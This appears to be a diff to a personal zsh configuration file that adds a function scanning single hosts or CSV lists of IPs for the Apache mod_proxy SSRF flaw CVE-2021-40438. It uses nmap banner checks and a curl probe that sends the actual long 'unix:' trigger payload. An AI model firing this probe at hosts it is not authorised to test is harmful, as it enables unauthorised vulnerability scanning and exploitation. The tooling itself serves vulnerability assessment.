@@ -265,3 +265,87 @@ preexec() { echo -ne '\e[5 q'; }
 eval $(thefuck --alias)
 
 PATH=~/.console-ninja/.bin:$PATH
+
+cve40438() {
+  local ipport ipfile outfile bulk
+  while [[ $1 ]]; do
+    case $1 in
+      -i) ipport=$2; shift 2 ;;
+      -f) ipfile=$2; bulk=1; shift 2 ;;
+      -o) outfile=$2; shift 2 ;;
+      *)  echo "usage: cve40438 -i ip[:port] | -f file.csv [-o out.csv]"; return 1 ;;
+    esac
+  done
+  [[ -z $ipport && -z $ipfile ]] && { echo "Specify -i or -f"; return 1; }
+  [[ -n $outfile && ! -f $outfile ]] && echo "IP,Port,Version,HTTP_Code,Vulnerable" > "$outfile"
+
+  probe() {
+    local base="$3://$1"
+    [[ ($3 == http  && $2 != 80) || ($3 == https && $2 != 443) ]] && base+=":$2"
+    local payload="unix:$(python3 -c 'print(\"A\"*7701)')|http://192.0.2.1:9/"
+    curl -ks -o /dev/null -w '%{http_code}' "$base/?$payload"
+  }
+
+  scan_host() {
+    local host=$1 port=$2 scheme nmap_out ver major minor patch vuln code retry_port retry_scheme
+    [[ -z $port ]] && { nc -z -w1 $host 80 2>/dev/null && port=80 || port=443; }
+
+    echo "== nmap banner check =="
+    nmap_out=$(nmap -Pn -p$port -sV --version-light -oG - "$host" 2>/dev/null | tr -d '\r')
+    printf '%s\n' "$nmap_out" | sed 's/^/   /'
+
+    [[ $nmap_out == *ssl* ]] && scheme=https || scheme=http
+    ver=$(grep -oE 'Apache httpd [0-9]+\.[0-9]+\.[0-9]+' <<< "$nmap_out" | head -1 | awk '{print $3}')
+
+    vuln="Unknown"
+    if [[ -n $ver ]]; then
+      IFS=. read -r major minor patch <<< "$ver"
+      if (( major==2 && minor==4 && patch<=48 )); then
+        vuln="Potential"; echo "→ Banner ≤2.4.48 ⇒ potentially vulnerable."
+        [[ $nmap_out == *CentOS* || $nmap_out == *Red\ Hat* ]] && echo "  (CentOS/RHEL back-ports—check ≥2.4.6-97)."
+      else
+        vuln="Patched"; echo "→ Banner ≥2.4.49 ⇒ patched upstream."
+      fi
+    else
+      ver="(none)"; echo "→ No Apache banner—CVE not applicable."
+    fi
+
+    [[ -z $bulk ]] && { echo; read -q "?Run curl probe? [y/N] " || { echo; return; }; echo; }
+
+    code=$(probe "$host" "$port" "$scheme")
+    if [[ $code == 000 ]]; then
+      if (( port==80 )) && nc -z -w1 $host 443 2>/dev/null; then
+        retry_port=443; retry_scheme=https
+      elif (( port==443 )) && nc -z -w1 $host 80 2>/dev/null; then
+        retry_port=80; retry_scheme=http
+      fi
+      if [[ -n $retry_port ]]; then
+        echo "   (retrying on $retry_scheme://$host …)"
+        code=$(probe "$host" "$retry_port" "$retry_scheme")
+        port=$retry_port; scheme=$retry_scheme
+      fi
+    fi
+
+    case $code in
+      502|503) vuln="Vulnerable"; echo "Probe $code ⇒ **VULNERABLE**." ;;
+      000)     echo "Probe 000 ⇒ WAF/firewall or vhost mismatch." ;;
+      *)       echo "Probe $code ⇒ exploit not successful." ;;
+    esac
+
+    [[ -n $outfile ]] && printf '%s,%s,%s,%s,%s\n' "$host" "$port" "${ver:-none}" "$code" "$vuln" >> "$outfile"
+  }
+
+  if [[ -n $ipport ]]; then
+    scan_host "${ipport%%:*}" "${ipport#*:}"
+  else
+    while IFS=, read -r h p <&3; do
+      [[ -z $h ]] && continue
+      echo "=============================================================="
+      echo "Scanning $h${p:+:$p}"
+      scan_host "$h" "$p"
+      echo
+    done 3< "$ipfile"
+  fi
+}
+
+
